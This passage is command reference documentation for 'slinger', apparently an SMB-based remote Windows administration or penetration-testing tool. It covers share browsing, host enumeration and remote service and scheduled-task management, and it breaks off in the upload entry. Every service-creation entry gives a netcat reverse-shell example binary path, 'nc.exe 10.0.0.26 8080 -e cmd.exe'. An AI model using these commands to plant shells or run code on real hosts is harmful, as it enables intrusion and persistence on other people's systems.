# CLI Commands Documentation

## `use`

**Description:** Connect to a specific share on the remote server

**Help:**
```
usage: slinger use [-h] share

Connect to a specific share on the remote server

positional arguments:
  share       Specify the share name to connect to

options:
  -h, --help  show this help message and exit

Example Usage: use sharename

```

**Example Usage:**
```
Example Usage: use sharename
```

### Arguments

- **`share`**: Specify the share name to connect to
  - Required: Yes

---

## `ls`

**Description:** List contents of a directory at a specified path

**Help:**
```
usage: slinger ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [-sr] [-l] [path]

List contents of a directory at a specified path

positional arguments:
  path                  Path to list contents, defaults to current path

options:
  -h, --help            show this help message and exit
  -s {name,size,created,lastaccess,lastwrite}, --sort {name,size,created,lastaccess,lastwrite}
                        Sort the directory contents by name, size, or date
  -sr, --sort-reverse   Reverse the sort order
  -l, --long            Display long format listing

Example Usage: ls /path/to/directory

```

**Example Usage:**
```
Example Usage: ls /path/to/directory
```

### Arguments

- **`path`**: Path to list contents, defaults to current path
  - Default: `.`
  - Required: No

- **`sort`**: Sort the directory contents by name, size, or date
  - Choices: name, size, created, lastaccess, lastwrite
  - Default: `date`
  - Required: No

---

## `shares`

**Description:** List all shares available on the remote server

**Help:**
```
usage: slinger shares [-h]

List all shares available on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: shares

```

**Example Usage:**
```
Example Usage: shares
```

---

## `enumshares`

**Description:** List all shares available on the remote server

**Help:**
```
usage: slinger shares [-h]

List all shares available on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: shares

```

**Example Usage:**
```
Example Usage: shares
```

---

## `cat`

**Description:** Display the contents of a specified file on the remote server

**Help:**
```
usage: slinger cat [-h] remote_path

Display the contents of a specified file on the remote server

positional arguments:
  remote_path  Specify the remote file path to display contents

options:
  -h, --help   show this help message and exit

Example Usage: cat /path/to/file

```

**Example Usage:**
```
Example Usage: cat /path/to/file
```

### Arguments

- **`remote_path`**: Specify the remote file path to display contents
  - Required: Yes

---

## `cd`

**Description:** Change to a different directory on the remote server

**Help:**
```
usage: slinger cd [-h] [path]

Change to a different directory on the remote server

positional arguments:
  path        Directory path to change to, defaults to current directory

options:
  -h, --help  show this help message and exit

Example Usage: cd /path/to/directory

```

**Example Usage:**
```
Example Usage: cd /path/to/directory
```

### Arguments

- **`path`**: Directory path to change to, defaults to current directory
  - Default: `.`
  - Required: No

---

## `pwd`

**Description:** Print the current working directory on the remote server

**Help:**
```
usage: slinger pwd [-h]

Print the current working directory on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: pwd

```

**Example Usage:**
```
Example Usage: pwd
```

---

## `exit`

**Description:** Exit the application

**Help:**
```
usage: slinger exit [-h]

Exit the application

options:
  -h, --help  show this help message and exit

Example Usage: exit

```

**Example Usage:**
```
Example Usage: exit
```

---

## `quit`

**Description:** Exit the application

**Help:**
```
usage: slinger exit [-h]

Exit the application

options:
  -h, --help  show this help message and exit

Example Usage: exit

```

**Example Usage:**
```
Example Usage: exit
```

---

## `logout`

**Description:** Exit the application

**Help:**
```
usage: slinger exit [-h]

Exit the application

options:
  -h, --help  show this help message and exit

Example Usage: exit

```

**Example Usage:**
```
Example Usage: exit
```

---

## `logoff`

**Description:** Exit the application

**Help:**
```
usage: slinger exit [-h]

Exit the application

options:
  -h, --help  show this help message and exit

Example Usage: exit

```

**Example Usage:**
```
Example Usage: exit
```

---

## `clear`

**Description:** Clear the screen

**Help:**
```
usage: slinger clear [-h]

Clear the screen

options:
  -h, --help  show this help message and exit

Example Usage: clear

```

**Example Usage:**
```
Example Usage: clear
```

---

## `help`

**Description:** Display help information for the application

**Help:**
```
usage: slinger help [-h] [cmd]

Display help information for the application

positional arguments:
  cmd         Specify a command to show help for

options:
  -h, --help  show this help message and exit

Example Usage: help

```

**Example Usage:**
```
Example Usage: help
```

### Arguments

- **`cmd`**: Specify a command to show help for
  - Required: No

---

## `who`

**Description:** List the current sessions connected to the target host

**Help:**
```
usage: slinger who [-h]

List the current sessions connected to the target host

options:
  -h, --help  show this help message and exit

Example Usage: who

```

**Example Usage:**
```
Example Usage: who
```

---

## `enumdisk`

**Description:** Enumerate server disk information

**Help:**
```
usage: slinger enumdisk [-h]

Enumerate server disk information

options:
  -h, --help  show this help message and exit

Example Usage: enumdisk

```

**Example Usage:**
```
Example Usage: enumdisk
```

---

## `enumlogons`

**Description:** Enumerate users currently logged on the server

**Help:**
```
usage: slinger enumlogons [-h]

Enumerate users currently logged on the server

options:
  -h, --help  show this help message and exit

Example Usage: enumlogons

```

**Example Usage:**
```
Example Usage: enumlogons
```

---

## `enuminfo`

**Description:** Enumerate detailed information about the remote host

**Help:**
```
usage: slinger enuminfo [-h]

Enumerate detailed information about the remote host

options:
  -h, --help  show this help message and exit

Example Usage: enuminfo

```

**Example Usage:**
```
Example Usage: enuminfo
```

---

## `enumsys`

**Description:** Enumerate system information of the remote host

**Help:**
```
usage: slinger enumsys [-h]

Enumerate system information of the remote host

options:
  -h, --help  show this help message and exit

Example Usage: enumsys

```

**Example Usage:**
```
Example Usage: enumsys
```

---

## `enumtransport`

**Description:** Enumerate transport information of the remote host

**Help:**
```
usage: slinger enumtransport [-h]

Enumerate transport information of the remote host

options:
  -h, --help  show this help message and exit

Example Usage: enumtransport

```

**Example Usage:**
```
Example Usage: enumtransport
```

---

## `enumservices`

**Description:** Enumerate services on the remote host

**Help:**
```
usage: slinger enumservices [-h] [-n] [--filter FILTER]

Enumerate services on the remote host

options:
  -h, --help       show this help message and exit
  -n, --new        Perform a new enumeration of services even if already enumerated
  --filter FILTER  Filter services by name or state

Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n

```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `servicesenum`

**Description:** Enumerate services on the remote host

**Help:**
```
usage: slinger enumservices [-h] [-n] [--filter FILTER]

Enumerate services on the remote host

options:
  -h, --help       show this help message and exit
  -n, --new        Perform a new enumeration of services even if already enumerated
  --filter FILTER  Filter services by name or state

Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n

```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `svcenum`

**Description:** Enumerate services on the remote host

**Help:**
```
usage: slinger enumservices [-h] [-n] [--filter FILTER]

Enumerate services on the remote host

options:
  -h, --help       show this help message and exit
  -n, --new        Perform a new enumeration of services even if already enumerated
  --filter FILTER  Filter services by name or state

Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n

```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `services`

**Description:** Enumerate services on the remote host

**Help:**
```
usage: slinger enumservices [-h] [-n] [--filter FILTER]

Enumerate services on the remote host

options:
  -h, --help       show this help message and exit
  -n, --new        Perform a new enumeration of services even if already enumerated
  --filter FILTER  Filter services by name or state

Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n

```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `serviceshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
usage: slinger serviceshow [-h] (-i SERVICEID | service_name)

Show details of a specific service on the remote server

positional arguments:
  service_name          Specify the name of the service to show

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to show details for

Example Usage: serviceshow -i 123

```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `svcshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
usage: slinger serviceshow [-h] (-i SERVICEID | service_name)

Show details of a specific service on the remote server

positional arguments:
  service_name          Specify the name of the service to show

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to show details for

Example Usage: serviceshow -i 123

```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `showservice`

**Description:** Show details of a specific service on the remote server

**Help:**
```
usage: slinger serviceshow [-h] (-i SERVICEID | service_name)

Show details of a specific service on the remote server

positional arguments:
  service_name          Specify the name of the service to show

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to show details for

Example Usage: serviceshow -i 123

```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `servicestart`

**Description:** Start a specified service on the remote server

**Help:**
```
usage: slinger servicestart [-h] (-i SERVICEID | service_name)

Start a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to start

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to start

Example Usage: servicestart -i 123 OR svcstart Spooler

```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `svcstart`

**Description:** Start a specified service on the remote server

**Help:**
```
usage: slinger servicestart [-h] (-i SERVICEID | service_name)

Start a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to start

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to start

Example Usage: servicestart -i 123 OR svcstart Spooler

```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicerun`

**Description:** Start a specified service on the remote server

**Help:**
```
usage: slinger servicestart [-h] (-i SERVICEID | service_name)

Start a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to start

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to start

Example Usage: servicestart -i 123 OR svcstart Spooler

```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicestop`

**Description:** Stop a specified service on the remote server

**Help:**
```
usage: slinger servicestop [-h] (-i SERVICEID | service_name)

Stop a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to stop

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to stop

Example Usage: servicestop -i 123 OR svcstop Spooler

```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `svcstop`

**Description:** Stop a specified service on the remote server

**Help:**
```
usage: slinger servicestop [-h] (-i SERVICEID | service_name)

Stop a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to stop

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to stop

Example Usage: servicestop -i 123 OR svcstop Spooler

```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `serviceenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
usage: slinger serviceenable [-h] (-i SERVICEID | service_name)

Enable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to enable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to enable

Example Usage: serviceenable -i 123 OR svcenable Spooler

```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `svcenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
usage: slinger serviceenable [-h] (-i SERVICEID | service_name)

Enable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to enable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to enable

Example Usage: serviceenable -i 123 OR svcenable Spooler

```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enableservice`

**Description:** Enable a specified service on the remote server

**Help:**
```
usage: slinger serviceenable [-h] (-i SERVICEID | service_name)

Enable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to enable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to enable

Example Usage: serviceenable -i 123 OR svcenable Spooler

```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enablesvc`

**Description:** Enable a specified service on the remote server

**Help:**
```
usage: slinger serviceenable [-h] (-i SERVICEID | service_name)

Enable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to enable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to enable

Example Usage: serviceenable -i 123 OR svcenable Spooler

```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `servicedisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
usage: slinger servicedisable [-h] (-i SERVICEID | service_name)

Disable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to disable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to disable

Example Usage: servicedisable -i 123 OR svcdisable Spooler

```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `svcdisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
usage: slinger servicedisable [-h] (-i SERVICEID | service_name)

Disable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to disable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to disable

Example Usage: servicedisable -i 123 OR svcdisable Spooler

```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disableservice`

**Description:** Disable a specified service on the remote server

**Help:**
```
usage: slinger servicedisable [-h] (-i SERVICEID | service_name)

Disable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to disable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to disable

Example Usage: servicedisable -i 123 OR svcdisable Spooler

```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disablesvc`

**Description:** Disable a specified service on the remote server

**Help:**
```
usage: slinger servicedisable [-h] (-i SERVICEID | service_name)

Disable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to disable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to disable

Example Usage: servicedisable -i 123 OR svcdisable Spooler

```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `servicedel`

**Description:** Delete a specified service on the remote server

**Help:**
```
usage: slinger servicedel [-h] (-i SERVICEID | service_name)

Delete a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to delete

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to delete

Example Usage: servicedelete -i 123 OR svcdelete Spooler

```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `svcdelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
usage: slinger servicedel [-h] (-i SERVICEID | service_name)

Delete a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to delete

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to delete

Example Usage: servicedelete -i 123 OR svcdelete Spooler

```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `servicedelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
usage: slinger servicedel [-h] (-i SERVICEID | service_name)

Delete a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to delete

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to delete

Example Usage: servicedelete -i 123 OR svcdelete Spooler

```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `serviceadd`

**Description:** Create a new service on the remote server

**Help:**
```
usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}

Create a new service on the remote server

options:
  -h, --help            show this help message and exit
  -n SERVICENAME, --servicename SERVICENAME
                        Specify the name of the new service
  -b BINARYPATH, --binarypath BINARYPATH
                        Specify the binary path of the new service
  -d DISPLAYNAME, --displayname DISPLAYNAME
                        Specify the display name of the new service
  -s {auto,demand,system}, --starttype {auto,demand,system}
                        Specify the start type of the new service

Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"

```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`servicename`**: Specify the name of the new service
  - Required: Yes

- **`binarypath`**: Specify the binary path of the new service
  - Required: Yes

- **`displayname`**: Specify the display name of the new service
  - Required: Yes

- **`starttype`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svcadd`

**Description:** Create a new service on the remote server

**Help:**
```
usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}

Create a new service on the remote server

options:
  -h, --help            show this help message and exit
  -n SERVICENAME, --servicename SERVICENAME
                        Specify the name of the new service
  -b BINARYPATH, --binarypath BINARYPATH
                        Specify the binary path of the new service
  -d DISPLAYNAME, --displayname DISPLAYNAME
                        Specify the display name of the new service
  -s {auto,demand,system}, --starttype {auto,demand,system}
                        Specify the start type of the new service

Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"

```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`servicename`**: Specify the name of the new service
  - Required: Yes

- **`binarypath`**: Specify the binary path of the new service
  - Required: Yes

- **`displayname`**: Specify the display name of the new service
  - Required: Yes

- **`starttype`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `servicecreate`

**Description:** Create a new service on the remote server

**Help:**
```
usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}

Create a new service on the remote server

options:
  -h, --help            show this help message and exit
  -n SERVICENAME, --servicename SERVICENAME
                        Specify the name of the new service
  -b BINARYPATH, --binarypath BINARYPATH
                        Specify the binary path of the new service
  -d DISPLAYNAME, --displayname DISPLAYNAME
                        Specify the display name of the new service
  -s {auto,demand,system}, --starttype {auto,demand,system}
                        Specify the start type of the new service

Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"

```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`servicename`**: Specify the name of the new service
  - Required: Yes

- **`binarypath`**: Specify the binary path of the new service
  - Required: Yes

- **`displayname`**: Specify the display name of the new service
  - Required: Yes

- **`starttype`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svccreate`

**Description:** Create a new service on the remote server

**Help:**
```
usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}

Create a new service on the remote server

options:
  -h, --help            show this help message and exit
  -n SERVICENAME, --servicename SERVICENAME
                        Specify the name of the new service
  -b BINARYPATH, --binarypath BINARYPATH
                        Specify the binary path of the new service
  -d DISPLAYNAME, --displayname DISPLAYNAME
                        Specify the display name of the new service
  -s {auto,demand,system}, --starttype {auto,demand,system}
                        Specify the start type of the new service

Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"

```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`servicename`**: Specify the name of the new service
  - Required: Yes

- **`binarypath`**: Specify the binary path of the new service
  - Required: Yes

- **`displayname`**: Specify the display name of the new service
  - Required: Yes

- **`starttype`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `enumtasks`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
usage: slinger enumtasks [-h]

Enumerate scheduled tasks on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: enumtasks

```

**Example Usage:**
```
Example Usage: enumtasks
```

---

## `tasksenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
usage: slinger enumtasks [-h]

Enumerate scheduled tasks on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: enumtasks

```

**Example Usage:**
```
Example Usage: enumtasks
```

---

## `taskenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
usage: slinger enumtasks [-h]

Enumerate scheduled tasks on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: enumtasks

```

**Example Usage:**
```
Example Usage: enumtasks
```

---

## `taskshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
usage: slinger taskshow [-h] (-i TASKID | task_path)

Show details of a specific task on the remote server

positional arguments:
  task_path             Specify the full path of the task to show

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to show

Example Usage: tasksshow -i 123

```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`taskid`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `tasksshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
usage: slinger taskshow [-h] (-i TASKID | task_path)

Show details of a specific task on the remote server

positional arguments:
  task_path             Specify the full path of the task to show

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to show

Example Usage: tasksshow -i 123

```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`taskid`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `showtask`

**Description:** Show details of a specific task on the remote server

**Help:**
```
usage: slinger taskshow [-h] (-i TASKID | task_path)

Show details of a specific task on the remote server

positional arguments:
  task_path             Specify the full path of the task to show

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to show

Example Usage: tasksshow -i 123

```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`taskid`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `taskcreate`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
usage: slinger taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]

Create a new scheduled task on the remote server

options:
  -h, --help            show this help message and exit
  -n NAME, --name NAME  Specify the name of the new task
  -p PROGRAM, --program PROGRAM
                        Specify the program to run (cmd.exe)
  -a ARGUMENTS, --arguments ARGUMENTS
                        Specify the arguments to pass to the program
  -f FOLDER, --folder FOLDER
                        Specify the folder to create the task in
  -i INTERVAL, --interval INTERVAL
                        Specify an interval in minutes to run the task
  -d DATE, --date DATE  Specify the date to start the task (2099-12-31 14:01:00)

Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows

```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskadd`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
usage: slinger taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]

Create a new scheduled task on the remote server

options:
  -h, --help            show this help message and exit
  -n NAME, --name NAME  Specify the name of the new task
  -p PROGRAM, --program PROGRAM
                        Specify the program to run (cmd.exe)
  -a ARGUMENTS, --arguments ARGUMENTS
                        Specify the arguments to pass to the program
  -f FOLDER, --folder FOLDER
                        Specify the folder to create the task in
  -i INTERVAL, --interval INTERVAL
                        Specify an interval in minutes to run the task
  -d DATE, --date DATE  Specify the date to start the task (2099-12-31 14:01:00)

Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows

```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskrun`

**Description:** Run a specified task on the remote server

**Help:**
```
usage: slinger taskrun [-h] task_path

Run a specified task on the remote server

positional arguments:
  task_path   Specify the full path of the task to run

options:
  -h, --help  show this help message and exit

Example Usage: taskrun \\Windows\\newtask

```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskexec`

**Description:** Run a specified task on the remote server

**Help:**
```
usage: slinger taskrun [-h] task_path

Run a specified task on the remote server

positional arguments:
  task_path   Specify the full path of the task to run

options:
  -h, --help  show this help message and exit

Example Usage: taskrun \\Windows\\newtask

```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskdelete`

**Description:** Delete a specified task on the remote server

**Help:**
```
usage: slinger taskdelete [-h] [-i TASKID] [task_path]

Delete a specified task on the remote server

positional arguments:
  task_path             Specify the full path of the task to delete

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to delete

Example Usage: taskdelete -i 123

```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`taskid`**: Specify the ID of the task to delete
  - Required: No

---

## `taskdel`

**Description:** Delete a specified task on the remote server

**Help:**
```
usage: slinger taskdelete [-h] [-i TASKID] [task_path]

Delete a specified task on the remote server

positional arguments:
  task_path             Specify the full path of the task to delete

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to delete

Example Usage: taskdelete -i 123

```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`taskid`**: Specify the ID of the task to delete
  - Required: No

---

## `taskrm`

**Description:** Delete a specified task on the remote server

**Help:**
```
usage: slinger taskdelete [-h] [-i TASKID] [task_path]

Delete a specified task on the remote server

positional arguments:
  task_path             Specify the full path of the task to delete

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to delete

Example Usage: taskdelete -i 123

```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`taskid`**: Specify the ID of the task to delete
  - Required: No

---

## `upload`

**Description:** Upload a file to the remote server

**Help:**
```
usage: slinger upload [-h] local_path [remote_path]

Upload a file to the remote server

positional arguments:
  local_path   Specify the local file path to upload
